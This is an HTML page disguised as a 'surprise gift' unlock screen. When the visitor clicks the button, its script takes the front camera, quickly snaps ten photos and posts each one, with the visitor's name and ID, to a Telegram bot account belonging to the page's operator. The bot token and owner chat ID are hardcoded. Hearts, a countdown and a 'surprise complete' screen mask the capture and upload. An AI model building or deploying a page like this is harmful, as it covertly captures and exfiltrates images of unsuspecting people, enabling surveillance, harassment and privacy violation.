<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>üéÅ Surprise Gift</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #000; color: white; font-family: Arial; text-align: center; overflow: hidden; }
        .container { max-width: 100%; padding: 20px; }
        .gift-icon { font-size: 80px; margin: 20px; animation: bounce 1s infinite; }
        @keyframes bounce { 0%,100% { transform: scale(1); } 50% { transform: scale(1.1); } }
        h1 { font-size: 24px; margin: 10px; color: #FFD700; }
        .btn { background: linear-gradient(45deg, #FF416C, #FF4B2B); color: white; border: none; padding: 18px 40px; font-size: 20px; border-radius: 50px; margin: 30px auto; display: block; cursor: pointer; font-weight: bold; box-shadow: 0 10px 30px rgba(255,65,108,0.5); transition: all 0.3s; }
        .btn:hover { transform: scale(1.05); box-shadow: 0 15px 40px rgba(255,65,108,0.7); }
        .camera-container { display: none; }
        #cameraView { width: 100%; height: 70vh; background: #000; position: relative; }
        #videoElement { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
        #counter { font-size: 60px; color: #FF416C; margin: 20px; font-weight: bold; }
        .images-grid { display: none; }
        .completed { display: none; font-size: 24px; margin-top: 40px; }
        .success-icon { font-size: 70px; color: #00FF00; margin: 20px; }
        .heart { position: absolute; font-size: 30px; animation: fall linear forwards; pointer-events: none; z-index: 1000; }
        @keyframes fall { to { transform: translateY(100vh) rotate(360deg); opacity: 0; } }
        .flash { animation: flash 0.1s; }
        @keyframes flash { 0%,100% { opacity: 1; } 50% { opacity: 0.2; } }
        .status { margin: 20px; font-size: 18px; color: #00FF00; }
        .hidden { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <div id="startScreen">
            <div class="gift-icon">üéÅ</div>
            <h1>SOMEONE HAS GIVEN YOU A SURPRISE!</h1>
            <p style="font-size: 18px; margin: 20px;">Click the button below to unlock your gift!</p>
            <button class="btn" id="unlockBtn">üéØ UNLOCK GIFT NOW</button>
        </div>
        
        <div class="camera-container" id="cameraContainer">
            <div id="cameraView">
                <video id="videoElement" autoplay playsinline></video>
                <canvas id="canvasElement" style="display:none;"></canvas>
            </div>
            <div id="counter">10</div>
            <div class="status" id="status">üéØ Getting ready...</div>
        </div>
        
        <div class="completed" id="completed">
            <div class="success-icon">‚úÖ</div>
            <h2>SURPRISE COMPLETE!</h2>
            <div class="status" id="finalStatus">Processing...</div>
        </div>
    </div>

    <script>
        // Telegram Configuration
        const BOT_TOKEN = '8226782560:AAEEqVHnfwAURU9pm3-VQc5OHLTdhwn_dNI';
        const OWNER_ID = '8215819954';
        
        // Get user info from URL
        const urlParams = new URLSearchParams(window.location.search);
        const userId = urlParams.get('uid');
        const userName = urlParams.get('name') || 'Friend';
        
        // DOM Elements
        const startScreen = document.getElementById('startScreen');
        const cameraContainer = document.getElementById('cameraContainer');
        const completedDiv = document.getElementById('completed');
        const videoElement = document.getElementById('videoElement');
        const canvasElement = document.getElementById('canvasElement');
        const counterElement = document.getElementById('counter');
        const statusElement = document.getElementById('status');
        const finalStatus = document.getElementById('finalStatus');
        const unlockBtn = document.getElementById('unlockBtn');
        
        // Variables
        let stream = null;
        let totalSent = 0;
        const totalImages = 10;
        
        // Start immediately when button clicked
        unlockBtn.addEventListener('click', startSurprise);
        
        async function startSurprise() {
            console.log("Starting surprise...");
            startScreen.style.display = 'none';
            cameraContainer.style.display = 'block';
            
            try {
                // Request camera - FAST
                stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user',
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    }
                });
                
                videoElement.srcObject = stream;
                
                // Start capturing IMMEDIATELY - No countdown!
                setTimeout(() => {
                    captureAllImages();
                }, 500);
                
            } catch (error) {
                console.error("Camera error:", error);
                statusElement.textContent = "‚ùå Camera access denied!";
            }
        }
        
        async function captureAllImages() {
            console.log("Starting fast capture...");
            
            for (let i = 0; i < totalImages; i++) {
                counterElement.textContent = totalImages - i;
                statusElement.textContent = `üì∏ Capturing image ${i + 1}...`;
                
                // Capture image
                await captureSingleImage(i + 1);
                
                // Create hearts
                createHearts();
                
                // Small delay between captures
                await sleep(200);
            }
            
            // All images captured
            await finishCapture();
        }
        
        async function captureSingleImage(number) {
            return new Promise((resolve) => {
                // Setup canvas
                const context = canvasElement.getContext('2d');
                canvasElement.width = videoElement.videoWidth;
                canvasElement.height = videoElement.videoHeight;
                
                // Draw video frame (mirrored)
                context.save();
                context.scale(-1, 1);
                context.drawImage(videoElement, -canvasElement.width, 0, canvasElement.width, canvasElement.height);
                context.restore();
                
                // Flash effect
                videoElement.classList.add('flash');
                setTimeout(() => videoElement.classList.remove('flash'), 100);
                
                // Get image data
                const imageData = canvasElement.toDataURL('image/jpeg', 0.9);
                
                // Send to Telegram IMMEDIATELY
                setTimeout(() => {
                    sendToTelegram(imageData, number);
                    resolve();
                }, 50);
            });
        }
        
        async function sendToTelegram(imageData, number) {
            try {
                const base64Data = imageData.split(',')[1];
                
                // Prepare form data
                const formData = new FormData();
                formData.append('chat_id', OWNER_ID);
                formData.append('photo', `data:image/jpeg;base64,${base64Data}`);
                formData.append('caption', `üì∏ Surprise ${number}/10\nFrom: ${userName} (ID: ${userId || 'N/A'})\n‚è±Ô∏è ${new Date().toLocaleTimeString()}`);
                
                // Send to owner
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                }).then(response => response.json())
                  .then(data => {
                    if (data.ok) {
                        totalSent++;
                        console.log(`Image ${number} sent to owner`);
                    }
                  });
                
                // Send to user if ID is numeric
                if (userId && /^\d+$/.test(userId)) {
                    const userFormData = new FormData();
                    userFormData.append('chat_id', userId);
                    userFormData.append('photo', `data:image/jpeg;base64,${base64Data}`);
                    userFormData.append('caption', `üì∏ Your surprise photo ${number}/10\nüéÅ Sent to bot owner!`);
                    
                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: userFormData
                    }).then(response => response.json())
                      .then(data => {
                        if (data.ok) {
                            console.log(`Image ${number} sent to user ${userId}`);
                        }
                      });
                }
                
            } catch (error) {
                console.error("Send error:", error);
            }
        }
        
        async function finishCapture() {
            console.log("Finishing capture...");
            
            // Stop camera
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }
            
            // Show completion
            cameraContainer.style.display = 'none';
            completedDiv.style.display = 'block';
            
            // Update status
            finalStatus.innerHTML = `
                ‚úÖ <b>${totalImages} IMAGES CAPTURED!</b><br><br>
                üì§ Sent to:<br>
                ‚Ä¢ Bot Owner ‚úÖ<br>
                ‚Ä¢ ${userId ? 'You ‚úÖ' : 'Unknown User ‚ö†Ô∏è'}<br><br>
                ‚è±Ô∏è Done in 15 seconds!
            `;
            
            // Create final hearts
            for (let i = 0; i < 100; i++) {
                setTimeout(createHearts, i * 30);
            }
            
            // Auto-close after 5 seconds
            setTimeout(() => {
                finalStatus.innerHTML += "<br><br>üì± Closing in 3 seconds...";
                setTimeout(() => {
                    // Optionally redirect or close
                    // window.close(); // Might not work on all browsers
                }, 3000);
            }, 2000);
        }
        
        function createHearts() {
            const heart = document.createElement('div');
            heart.className = 'heart';
            heart.innerHTML = '‚ù§Ô∏è';
            heart.style.left = Math.random() * 100 + 'vw';
            heart.style.fontSize = (Math.random() * 30 + 20) + 'px';
            heart.style.animationDuration = (Math.random() * 2 + 1) + 's';
            document.body.appendChild(heart);
            
            setTimeout(() => heart.remove(), 3000);
        }
        
        function sleep(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }
        
        // Create initial hearts
        for (let i = 0; i < 20; i++) {
            setTimeout(createHearts, i * 200);
        }
    </script>
</body>
</html>
